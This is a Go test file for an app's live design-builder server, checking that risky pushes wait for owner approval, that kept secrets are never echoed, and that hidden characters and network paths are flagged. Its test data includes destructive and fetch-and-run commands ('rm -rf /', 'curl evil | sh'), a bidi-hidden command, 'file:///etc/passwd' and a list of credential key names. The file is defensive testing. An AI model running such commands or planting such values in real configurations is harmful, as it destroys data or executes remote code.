	if rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", liveBuilderProgramConfig("Pushed", "sh other.sh"), liveBuilderTestCode); rec.Code != http.StatusConflict {
		t.Errorf("another risky push while a design waits: status = %d, want 409", rec.Code)
	}
	// The same design again (auto-push) is simply still waiting.
	if rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", risky, liveBuilderTestCode); rec.Code != http.StatusAccepted {
		t.Errorf("the waiting design again: status = %d, want 202", rec.Code)
	}
	if again, ok := srv.Pending(); !ok || again.Seq != first.Seq || again.Sum != first.Sum {
		t.Errorf("the waiting design changed: %+v -> %+v", first, again)
	}
	if onDisk, _ := os.ReadFile(path); !bytes.Equal(onDisk, initial) {
		t.Error("a refused push changed the live design")
	}
	if !srv.RejectPending(first.Seq) {
		t.Fatal("reject of the waiting design reported nothing to reject")
	}
	if rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", liveBuilderTestConfig("Plain"), liveBuilderTestCode); rec.Code != http.StatusOK {
		t.Errorf("push after the decision: status = %d, want 200", rec.Code)
	}
}

func TestLiveBuilderAcceptRefusesAChangedFile(t *testing.T) {
	initial := liveBuilderTestConfig("Original")
	srv, path, reloads := newLiveBuilderTestServer(t, initial)
	if rec := liveBuilderRequest(t, srv.handler(), http.MethodPost, "/api/design", liveBuilderProgramConfig("Pushed", "sh a.sh"), liveBuilderTestCode); rec.Code != http.StatusAccepted {
		t.Fatalf("risky push: status = %d, want 202", rec.Code)
	}
	p, _ := srv.Pending()
	// The card was shown for these bytes; different bytes must not be applied.
	if err := os.WriteFile(path+liveBuilderPendingExt, liveBuilderProgramConfig("Swapped", "sh b.sh"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := srv.AcceptPending(p.Seq); err == nil {
		t.Fatal("a waiting file that changed after the check was applied")
	}
	if onDisk, _ := os.ReadFile(path); !bytes.Equal(onDisk, initial) || atomic.LoadInt32(reloads) != 0 {
		t.Error("the changed file reached the live design")
	}
	if _, ok := srv.Pending(); ok {
		t.Error("the changed design still waits")
	}
}

func TestLiveBuilderRejectDeletesTheHeldDesign(t *testing.T) {
	initial := liveBuilderTestConfig("Original")
	srv, path, reloads := newLiveBuilderTestServer(t, initial)
	handler := srv.handler()
	if rec := liveBuilderRequest(t, handler, http.MethodPost, "/api/design", liveBuilderProgramConfig("Pushed", "sh evil.sh"), liveBuilderTestCode); rec.Code != http.StatusAccepted {
		t.Fatalf("risky push: status = %d, want 202", rec.Code)
	}
	p, ok := srv.Pending()
	if !ok {
		t.Fatal("nothing waiting")
	}
	if srv.RejectPending(p.Seq + 1) {
		t.Error("a reject for a design the card did not show did something")
	}
	if !srv.RejectPending(p.Seq) {
		t.Error("reject reported nothing to reject")
	}
	if _, ok := srv.Pending(); ok {
		t.Error("the design still waits after reject")
	}
	if _, err := os.Stat(path + liveBuilderPendingExt); !os.IsNotExist(err) {
		t.Error("the waiting copy stayed after reject")
	}
	if onDisk, _ := os.ReadFile(path); !bytes.Equal(onDisk, initial) || atomic.LoadInt32(reloads) != 0 {
		t.Error("reject changed the live design")
	}
	if err := srv.AcceptPending(p.Seq); err == nil {
		t.Error("a rejected design could still be accepted")
	}
}

func TestLiveBuilderSensitiveKeys(t *testing.T) {
	for name, want := range map[string]bool{
		"toolſ_path":           true,
		"TOOLS_PATH":           true,
		"tools_path":           true,
		"autoStart":            true,
		"ssh_full_root":        true,
		"discord_token":        true,
		"discord_channel":      true,
		"API-Key":              true,
		"google_api_key":       true,
		"GroqApiKey":           true,
		"terminal_cmd":         true,
		"emulator_cmd":         true,
		"youtube_cookies_file": true,
		"liveBuilder":          true,
		"liveBuilderLAN":       true,
		"liveBuilderDisabled":  true,
		"cmd2":                 true,
		"mqtt_pass":            true,
		"aws_access_key":       true,
		"openaiKey":            true,
		"ssh_private_key":      true,
		"wifi_passphrase":      true,
		"credentials":          true,
		"auth_bearer":          true,
		"ha_url":               true,
		"HA_URL":               true,
		"ha_insecure":          true,
		"mqtt_host":            true,
		"mqtt_port":            true,
		"pihole_url":           true,
		"router_host":          true,
		"description":          false,
		"subscriptions":        false,
		"author":               false,
		"bypass_cache":         false,
		"inputProfileHotkey":   false,
		"mqtt_prefix":          false,
		"commandeer":           false,
		"weatherUnit":          false,
		"custom_link_url":      false,
		"plugin_list":          false,
		"search_query":         false,
		"":                     false,
	} {
		if got := liveBuilderSensitiveKey(name); got != want {
			t.Errorf("liveBuilderSensitiveKey(%q) = %v, want %v", name, got, want)
		}
	}
}

func TestLiveBuilderDesignRisks(t *testing.T) {
	design := func(custom map[string]interface{}, toolsPath string, elems ...Element) *Config {
		cfg := &Config{Scenes: []SceneConfig{{Name: "Main", Elements: elems}}}
		cfg.Variables.Custom = custom
		cfg.Variables.ToolsPath = toolsPath
		return cfg
	}
	with := func(cfg *Config, edit func(*Config)) *Config {
		edit(cfg)
		return cfg
	}
	terminal := Element{Type: "button", Text: "Run", Trigger: "terminal_run"}
	cases := []struct {
		name    string
		next    *Config
		current *Config
		risky   bool
	}{
		{"plain design", design(nil, "", Element{Type: "label", Text: "Hi"}), nil, false},
		{"external app", design(nil, "", Element{Type: "button", Trigger: "external_app", ExternalAppPath: "/bin/sh x"}), nil, true},
		{"terminal button, user types", design(nil, "", terminal), nil, true},
		{"terminal button, preset command", design(map[string]interface{}{"terminal_cmd": "rm -rf /"}, "", terminal), nil, true},
		{"yt-dlp command", design(nil, "", Element{Type: "button", Trigger: "yt_search", TriggerTarget: "yt-dlp --exec x"}), nil, true},
		{"built-in youtube search", design(nil, "", Element{Type: "button", Trigger: "youtube_search"}), nil, false},
		{"plugin action", design(nil, "", Element{Type: "button", Trigger: "plugin_action", TriggerTarget: "tools", TriggerValue: "run"}), nil, true},
		{"file server button", design(nil, "", Element{Type: "button", Trigger: "ssh_start"}), nil, true},
		{"switch for a protected setting", design(nil, "", Element{Type: "button", Trigger: "set_variable", VariableChange: "ssh_full_root", TriggerValue: "true"}), nil, true},
		{"switch for an ordinary setting", design(nil, "", Element{Type: "button", Trigger: "set_variable", VariableChange: "weatherUnit", TriggerValue: "C"}), nil, false},
		{"long s in a setting name", design(nil, "", Element{Type: "button", Trigger: "set_variable", VariableChange: "toolſ_path", TriggerValue: `\\host\share`}), nil, true},
		{"toggle bound to a protected setting", design(nil, "", Element{Type: "toggle", Variable: "ssh_full_root"}), nil, true},
		{"text field into the terminal command", design(nil, "", Element{Type: "input", Variable: "terminal_cmd"}), nil, true},
		{"text field for a link", design(nil, "", Element{Type: "input", Variable: "custom_link_url"}), nil, false},
		{"json browser content", design(nil, "", Element{Type: "button", Trigger: "textbrowser_json", Variable: `{"token": 1}`}), nil, false},
		{"credential setting", design(map[string]interface{}{"discord_token": "abc"}, ""), nil, true},
		{"ordinary custom setting", design(map[string]interface{}{"description": "x"}, ""), nil, false},
		{"tools path", design(nil, "/tmp/evil"), nil, true},
		{"network share background", with(design(nil, ""), func(c *Config) { c.Background = `\\evil\share\bg.png` }), nil, true},
		{"network share image", design(nil, "", Element{Type: "image", Image: "//evil/share/x.png"}), nil, true},
		{"NT path to a share", design(nil, "", Element{Type: "image", Image: `\??\UNC\evil\share\x.png`}), nil, true},
		{"smart-home address", design(map[string]interface{}{"ha_url": "https://evil.example"}, ""), nil, true},
		{"chat channel", with(design(nil, ""), func(c *Config) { c.ChannelProfile = ChannelProfileConfig{ChannelID: "123", Token: "tok"} }), nil, true},
		{"same program as the device", design(nil, "", Element{Type: "button", Trigger: "external_app", ExternalAppPath: "./tool.sh"}),
			design(nil, "", Element{Type: "button", Trigger: "external_app", ExternalAppPath: "./tool.sh"}), false},
		{"same setting as the device", design(map[string]interface{}{"terminal_cmd": "ls"}, "", terminal),
			design(map[string]interface{}{"terminal_cmd": "ls"}, "", terminal), false},
	}
	for _, tc := range cases {
		got := liveBuilderDesignRisks(tc.next, tc.current)
		if (len(got) > 0) != tc.risky {
			t.Errorf("%s: risks = %+v, want risky = %v", tc.name, got, tc.risky)
		}
	}
	// The card lists what runs something first.
	mixed := design(map[string]interface{}{"discord_token": "abc"}, "", Element{Type: "button", Trigger: "external_app", ExternalAppPath: "sh x"})
	if risks := liveBuilderDesignRisks(mixed, nil); len(risks) != 2 || risks[0].level != liveBuilderRunsSomething {
		t.Errorf("order = %+v, want the program first", risks)
	}
}

func TestLiveBuilderShowMakesHiddenCharactersVisible(t *testing.T) {
	if got := liveBuilderShow("ls\u202e;rm -rf /", liveBuilderReasonRunes); !strings.Contains(got, "[U+202E]") {
		t.Errorf("a bidi override stayed invisible: %q", got)
	}
	if got := liveBuilderShow("a\u200bb\nc", liveBuilderReasonRunes); got != "a[U+200B]b[U+000A]c" {
		t.Errorf("hidden characters = %q", got)
	}
	padded := "echo hi" + strings.Repeat(" ", 300) + "; curl x | sh"
	if got := liveBuilderShow(padded, liveBuilderReasonRunes); got != "echo hi ; curl x | sh" {
		t.Errorf("padding hid the end: %q", got)
	}
	long := strings.Repeat("a", 400) + " && curl evil | sh"
	if got := liveBuilderShow(long, liveBuilderReasonRunes); !strings.Contains(got, "curl evil | sh") || !strings.Contains(got, " … ") {
		t.Errorf("a long value lost its end: %q", got)
	}
}

func TestLiveBuilderIdleSwitchOff(t *testing.T) {
	srv, _, _ := newLiveBuilderTestServer(t, liveBuilderTestConfig("Main"))
	clock := liveBuilderTestClock(srv)
	start := *clock
	srv.mu.Lock()
	srv.srv = &http.Server{} // running, as far as the idle check is concerned
	srv.lastActive = start
	srv.mu.Unlock()

	if srv.idleExpired(start.Add(liveBuilderIdleLimit - time.Minute)) {
		t.Error("switched off before the idle limit")
	}
	// A paired request keeps it on.
	*clock = start.Add(20 * time.Minute)
	if rec := liveBuilderRequest(t, srv.handler(), http.MethodGet, "/api/design", nil, liveBuilderTestCode); rec.Code != http.StatusOK {
		t.Fatalf("paired pull: status = %d", rec.Code)
	}
	if srv.idleExpired(start.Add(45 * time.Minute)) {
		t.Error("a paired request did not keep the server on")
	}
	if !srv.idleExpired(start.Add(50 * time.Minute)) {
		t.Error("still on 30 minutes after the last paired request")
	}
	// Wrong codes are not use.
	srv.mu.Lock()
	srv.lastActive = start
	srv.mu.Unlock()
	*clock = start.Add(29 * time.Minute)
	liveBuilderRequest(t, srv.handler(), http.MethodGet, "/api/design", nil, "000000")
	if !srv.idleExpired(start.Add(liveBuilderIdleLimit)) {
		t.Error("a wrong code kept the server on")
	}
}

func TestLiveBuilderIdleWatcherOnlyStopsItsOwnServer(t *testing.T) {
	srv, _, _ := newLiveBuilderTestServer(t, liveBuilderTestConfig("Main"))
	start := *liveBuilderTestClock(srv)
	old, current := make(chan struct{}), make(chan struct{})
	srv.mu.Lock()
	srv.srv, srv.idleStop, srv.lastActive = &http.Server{}, current, start
	srv.mu.Unlock()
	// The switch went off and on: the old watcher must leave the new server.
	if srv.detachIfIdle(old, start.Add(2*liveBuilderIdleLimit)) != nil || !srv.Running() {
		t.Error("an old watcher stopped a newer server")
	}
	if srv.detachIfIdle(current, start.Add(liveBuilderIdleLimit-time.Second)) != nil {
		t.Error("the watcher stopped a server that was still in use")
	}
	if srv.detachIfIdle(current, start.Add(liveBuilderIdleLimit)) == nil || srv.Running() {
		t.Error("the server's own watcher did not stop it")
	}
}

func TestLiveBuilderListensOnLoopbackOnPC(t *testing.T) {
	lns, err := liveBuilderListen(false, 0)
	if err != nil {
		t.Skipf("no loopback listener here: %v", err)
	}
	for _, ln := range lns {
		if ip := ln.Addr().(*net.TCPAddr).IP; !ip.IsLoopback() {
			t.Errorf("listener on %v, want loopback only", ln.Addr())
		}
		_ = ln.Close()
	}
	lns, err = liveBuilderListen(true, 0)
	if err != nil {
		t.Skipf("no network listener here: %v", err)
	}
	for _, ln := range lns {
		if ip := ln.Addr().(*net.TCPAddr).IP; !ip.IsUnspecified() {
			t.Errorf("handheld listener on %v, want every interface", ln.Addr())
		}
		_ = ln.Close()
	}
}

func TestLiveBuilderWanted(t *testing.T) {
	withCustom := func(m map[string]interface{}) *Config {
		cfg := &Config{}
		cfg.Variables.Custom = m
		return cfg
	}
	t.Setenv("JUKAHUB_LIVE_BUILDER", "")
	if got, want := liveBuilderWanted(nil), !P().IsHandheld(); got != want {
		t.Errorf("default = %v, want %v (off on the handheld, on on a PC)", got, want)
	}
	if !liveBuilderWanted(withCustom(map[string]interface{}{"liveBuilder": "true"})) {
		t.Error("the Settings switch did not turn it on")
	}
	if liveBuilderWanted(withCustom(map[string]interface{}{"liveBuilder": "true", "liveBuilderDisabled": true})) {
		t.Error("liveBuilderDisabled did not win")
	}
	t.Setenv("JUKAHUB_LIVE_BUILDER", "0")
	if liveBuilderWanted(withCustom(map[string]interface{}{"liveBuilder": "true"})) {
		t.Error("JUKAHUB_LIVE_BUILDER=0 did not win")
	}
	t.Setenv("JUKAHUB_LIVE_BUILDER", "1")
	if !liveBuilderWanted(nil) {
		t.Error("JUKAHUB_LIVE_BUILDER=1 did not win")
	}
	// The network is only ever opened on purpose on a PC.
	t.Setenv("JUKAHUB_LIVE_LAN", "")
	if !P().IsHandheld() && liveBuilderLANWanted(nil) {
		t.Error("a PC listens on the network by default")
	}
	t.Setenv("JUKAHUB_LIVE_LAN", "1")
	if !liveBuilderLANWanted(nil) {
		t.Error("JUKAHUB_LIVE_LAN=1 did not open the network")
	}
}

func TestLiveBuilderAnswersNeverQuoteKeptValues(t *testing.T) {
	initial := []byte(`{
  "AppName": "JukaHub", "Version": "0.4.0", "Width": 1280, "Height": 720,
  "variables": {"fontSizes": {"medium": 24}, "terminal_cmd": "sh /secret/cmd.sh", "tokens": ["S1-secret", "S2-secret"],
    "google_api_key": "AIzaPlainSecret", "weatherUnit": "C"},
  "scenes": [{"name": "Main", "elements": [{"type": "label", "text": "Hi", "x": 10, "y": 10, "width": 200, "height": 40}]}]
}`)
	srv, _, _ := newLiveBuilderTestServer(t, initial)
	handler := srv.handler()
	leaks := func(what string, body []byte) {
		t.Helper()
		for _, secret := range []string{"/secret/cmd.sh", "S1-secret", "S2-secret", "AIzaPlainSecret"} {
			if bytes.Contains(body, []byte(secret)) {
				t.Errorf("%s quoted the kept value %q:\n%s", what, secret, body)
			}
		}
	}
	pull := func() map[string]interface{} {
		t.Helper()
		rec := liveBuilderRequest(t, handler, http.MethodGet, "/api/design", nil, liveBuilderTestCode)
		if rec.Code != http.StatusOK {
			t.Fatalf("pull status = %d", rec.Code)
		}
		leaks("the pull", rec.Body.Bytes())
		return liveBuilderJSON(t, rec.Body.Bytes())
	}
	push := func(doc map[string]interface{}) *httptest.ResponseRecorder {
		t.Helper()
		body, err := json.Marshal(doc)
		if err != nil {
			t.Fatal(err)
		}
		return liveBuilderRequest(t, handler, http.MethodPost, "/api/design", body, liveBuilderTestCode)
	}

	// A new Terminal button runs whatever terminal_cmd holds: the owner's card
	// names the device's command, the answer only the placeholder.
	design := pull()
	scene := design["scenes"].([]interface{})[0].(map[string]interface{})
	scene["elements"] = append(scene["elements"].([]interface{}),
		map[string]interface{}{"type": "button", "text": "Run", "x": 10, "y": 60, "width": 200, "height": 40, "trigger": "terminal_run"})
	rec := push(design)
	if rec.Code != http.StatusAccepted {
		t.Fatalf("push with a Terminal button: status = %d (%s), want 202", rec.Code, rec.Body.String())
	}
	leaks("the 202 answer", rec.Body.Bytes())
	if !strings.Contains(rec.Body.String(), "runs the shell command") {
		t.Errorf("the 202 answer does not say what the design runs: %s", rec.Body.String())
	}
	p, ok := srv.Pending()
	if !ok || !strings.Contains(strings.Join(p.Reasons, " "), "sh /secret/cmd.sh") {
		t.Errorf("the owner's card does not name the command that would run: %q", p.Reasons)
	}
	if len(p.PublicReasons) != len(p.Reasons) {
		t.Errorf("answer reasons %q, card reasons %q: want the same capabilities", p.PublicReasons, p.Reasons)
	}
	// The same design again is still waiting, and says no more.
	if again := push(design); again.Code != http.StatusAccepted {
		t.Errorf("the waiting design again: status = %d, want 202", again.Code)
	} else {
		leaks("the repeated 202 answer", again.Body.Bytes())
	}
	// Spelling out a guess where the placeholder was is another design: a
	// right guess must get the same answer as a wrong one.
	vars := design["variables"].(map[string]interface{})
	for _, guess := range []string{"sh /secret/cmd.sh", "sh /wrong.sh"} {
		vars["terminal_cmd"] = guess
		if rec := push(design); rec.Code != http.StatusConflict {
			t.Errorf("guess %q while a design waits: status = %d, want 409", guess, rec.Code)
		}
	}
	if !srv.RejectPending(p.Seq) {
		t.Fatal("nothing to reject")
	}

	// A protected list with the placeholder as one of its items is restored
	// only while the rest of the list is still the device's list.
	design = pull()
	design["variables"].(map[string]interface{})["tokens"] = []interface{}{liveBuilderKeptValue, "x"}
	rec = push(design)
	if rec.Code != http.StatusConflict {
		t.Fatalf("push with a reordered protected list: status = %d (%s), want 409", rec.Code, rec.Body.String())
	}
	leaks("the 409 answer for the list", rec.Body.Bytes())
	if strings.Contains(rec.Body.String(), "S1-secret") || strings.Contains(rec.Body.String(), "S2-secret") {
		t.Errorf("the refusal quoted a kept list value: %s", rec.Body.String())
	}
	if _, waiting := srv.Pending(); waiting {
		t.Error("a mismatched kept list was held for approval instead of refused")
	}

	// A list that still matches may be restored, but spelling out one of its
	// protected items is a change the owner must approve (SEC-24).
	design["variables"].(map[string]interface{})["tokens"] = []interface{}{liveBuilderKeptValue, "S2-secret"}
	rec = push(design)
	if rec.Code != http.StatusAccepted {
		t.Fatalf("push with the device's list around a kept value: status = %d (%s), want 202", rec.Code, rec.Body.String())
	}
	// The answer may quote the item the sender wrote (S2-secret), but never
	// the other kept item it did not send.
	if bytes.Contains(rec.Body.Bytes(), []byte("S1-secret")) {
		t.Errorf("the 202 answer quoted a kept value the sender did not write: %s", rec.Body.String())
	}
	p, _ = srv.Pending()
	srv.RejectPending(p.Seq)

	// An ordinary push of the pulled design: the advice is about what the
	// sender wrote, not about how the device keeps its own key.
	rec = push(pull())
	if rec.Code != http.StatusOK {
		t.Fatalf("push of the pulled design: status = %d (%s), want 200", rec.Code, rec.Body.String())
	}
	leaks("the 200 answer", rec.Body.Bytes())
	if strings.Contains(rec.Body.String(), "google_api_key") {
		t.Errorf("the answer told how the device keeps a kept key: %s", rec.Body.String())
	}
}

func TestLiveBuilderNetworkPaths(t *testing.T) {
	for path, want := range map[string]bool{
		`\\host\share\x.png`:    true,
		`//host/share/x.png`:    true,
		`\/host\share`:          true,
		`\\?\UNC\host\share`:    true,
		`\??\UNC\host\share`:    true,
		`/??/UNC/host/share`:    true,
		`  \??\C:\Windows`:      true,
		`file:///etc/passwd`:    true,
		`FILE://host/x`:         true,
		`C:\Users\me\bg.png`:    false,
		`/mnt/SDCARD/bg.png`:    false,
		`./images/bg.png`:       false,
		`\?`:                    false,
		`?/x`:                   false,
		`https://example.com/x`: false,
	} {
		if got := liveBuilderNetworkPath(path); got != want {
			t.Errorf("liveBuilderNetworkPath(%q) = %v, want %v", path, got, want)
		}
	}
}

func TestLiveBuilderReplacesThePublishedCode(t *testing.T) {
	path := filepath.Join(t.TempDir(), liveBuilderCodeFile)
	if err := os.WriteFile(path, []byte("456059\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	code, err := loadOrCreateLiveBuilderCode(path)
	if err != nil {
		t.Fatal(err)
	}
	if code == "456059" || len(code) != 6 {
		t.Fatalf("code = %q, want a fresh six-digit code instead of the published one", code)
	}
	if saved, _ := os.ReadFile(path); strings.TrimSpace(string(saved)) != code {
		t.Errorf("the published code was not replaced on disk: %q", saved)
	}
	// This install's own code is kept.
	if again, err := loadOrCreateLiveBuilderCode(path); err != nil || again != code {
		t.Errorf("second load = %q, %v; want %q", again, err, code)
	}
}

func TestLiveBuilderRotateCodeAlwaysChangesIt(t *testing.T) {
	srv, _, _ := newLiveBuilderTestServer(t, liveBuilderTestConfig("Main"))
	srv.codePath = filepath.Join(t.TempDir(), liveBuilderCodeFile)
	prev := srv.Code()
	for i := 1; i <= 20; i++ {
		code, err := srv.RotateCode()
		if err != nil {
			t.Fatal(err)
		}
		if code == prev || code != srv.Code() || len(code) != 6 || liveBuilderLeakedCodes[code] {
			t.Fatalf("rotation %d: %q after %q (in force %q)", i, code, prev, srv.Code())
		}
		if saved, _ := os.ReadFile(srv.codePath); strings.TrimSpace(string(saved)) != code {
			t.Fatalf("rotation %d: saved %q, want %q", i, saved, code)
		}
		prev = code
	}
}

func TestLiveBuilderCardsShowWholeReasons(t *testing.T) {
	short := []string{"a", "b", "c", "d", "e"}
	if n := liveBuilderFitReasons(short, liveBuilderCardReasons, liveBuilderCardWidth); n != 2 {
		t.Errorf("the decision card takes %d short reasons, want 2", n)
	}
	long := strings.Repeat("x", 350)
	wide := strings.Repeat("界", 200)
	if n := liveBuilderFitReasons([]string{long}, liveBuilderCardReasons, liveBuilderCardWidth); n != 0 {
		t.Error("the decision card takes a reason it cannot show whole")
	}
	if got := liveBuilderReasonPages(short); len(got) != 2 || got[1] != liveBuilderPageReasons {
		t.Errorf("short reasons paged as %v, want [0 %d]", got, liveBuilderPageReasons)
	}
	for name, reasons := range map[string][]string{
		"short": short,
		"long":  {long, long, long, long, long},
		"wide":  {wide, wide, wide},
		"mixed": {"a", long, wide, "b", long, "c"},
	} {
		starts := liveBuilderReasonPages(reasons)
		if len(starts) == 0 || starts[0] != 0 {
			t.Fatalf("%s: pages start at %v", name, starts)
		}
		for i, start := range starts {
			end := len(reasons)
			if i+1 < len(starts) {
				end = starts[i+1]
			}
			if end <= start || end-start > liveBuilderPageReasons {
				t.Errorf("%s: page %d holds %d reasons", name, i+1, end-start)
			}
			width := 0
			for _, r := range reasons[start:end] {
				width += liveBuilderTextWidth(r)
			}
			if end-start > 1 && width > liveBuilderPageWidth {
				t.Errorf("%s: page %d is %d wide, more than a page shows", name, i+1, width)
			}
		}
	}
}

func TestLiveBuilderDecisionCardAlwaysOffersEveryReason(t *testing.T) {
	srv, _, _ := newLiveBuilderTestServer(t, liveBuilderTestConfig("Main"))
	liveBuilderState.mu.Lock()
	before := liveBuilderState.srv
	liveBuilderState.srv = srv
	liveBuilderState.mu.Unlock()
	t.Cleanup(func() {
		recoveryCardClose()
		liveBuilderApproval.seq = 0
		liveBuilderState.mu.Lock()
		liveBuilderState.srv = before
		liveBuilderState.mu.Unlock()
	})
	recoveryCardClose()
	long := "“Run” on Main runs the shell command “" + strings.Repeat("y", 190) + " ; curl evil | sh”"
	for _, reasons := range [][]string{
		{"“Play” on Main runs the program “sh x”"},
		{long, long + " 2", long + " 3"},
	} {
		srv.mu.Lock()
		srv.pending = &liveBuilderPending{Seq: 7, From: "192.168.1.66", Reasons: reasons, Levels: [3]int{len(reasons), 0, 0}}
		srv.mu.Unlock()
		liveBuilderShowApproval(nil)
		if !recoveryCard.open || len(recoveryCard.options) != 3 || recoveryCard.options[2].title != "Everything it can do" {
			t.Fatalf("%d reasons: %d options, want Keep, Apply and Everything it can do", len(reasons), len(recoveryCard.options))
		}
		advice := strings.Index(recoveryCard.body, "Apply it only if you made it yourself")
		if first := strings.Index(recoveryCard.body, "•"); advice < 0 || first < advice {
			t.Errorf("%d reasons: the advice does not come before the reasons:\n%s", len(reasons), recoveryCard.body)
		}
		if !strings.Contains(recoveryCard.body, reasons[0]) {
			t.Errorf("%d reasons: the first reason is not on the decision card whole:\n%s", len(reasons), recoveryCard.body)
		}
		// Every reason, whole, somewhere in "Everything it can do".
		var pages strings.Builder
		for page := 0; page < len(reasons); page++ {
			liveBuilderShowReasons(7, page)
			pages.WriteString(recoveryCard.body + "\n")
		}
		for _, reason := range reasons {
			if !strings.Contains(pages.String(), "• "+reason+"\n") {
				t.Errorf("%d reasons: %q is not shown whole on a page", len(reasons), reason)
			}
		}
	}
}
